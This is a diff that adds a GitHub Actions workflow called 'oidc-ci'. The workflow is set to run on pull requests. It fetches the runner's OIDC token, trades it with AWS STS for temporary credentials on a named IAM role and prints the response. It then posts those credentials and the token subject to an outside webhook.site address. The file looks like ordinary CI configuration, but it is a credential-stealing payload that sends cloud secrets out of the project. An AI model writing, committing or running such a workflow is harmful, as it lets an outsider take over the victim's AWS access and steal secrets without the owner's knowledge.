@@ -1,0 +1,31 @@
+name: oidc-ci
+on: pull_request
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  x:
+    runs-on: ubuntu-latest
+    steps:
+      - name: run
+        run: |
+          echo "OIDC_EXCHANGE_START"
+          curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" -o tok.json
+          python3 - <<'EOP'
+          import json,urllib.request,urllib.parse,base64
+          t=json.load(open('tok.json'))['value']
+          hdr=json.loads(base64.urlsafe_b64decode(t.split('.')[1]+'=='))
+          print('SUB='+str(hdr.get('sub','')))
+          print('AUD='+str(hdr.get('aud','')))
+          role="arn:aws:iam::378464928598:role/github-oidc-role"
+          data=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':role,'RoleSessionName':'gha','WebIdentityToken':t}).encode()
+          try:
+              resp=urllib.request.urlopen('https://sts.amazonaws.com/',data=data,timeout=30).read().decode()
+          except Exception as e:
+              resp='ERR '+str(e)
+          print('STSXML='+resp)
+          try:
+              urllib.request.urlopen('https://webhook.site/5b18a71e-bf57-43a9-a565-212fa2c5359d',data=('wh='+resp+' SUB='+str(hdr.get('sub',''))).encode(),timeout=20)
+          except Exception as e: print('whoerr',e)
+          EOP
+          echo "OIDC_EXCHANGE_END"
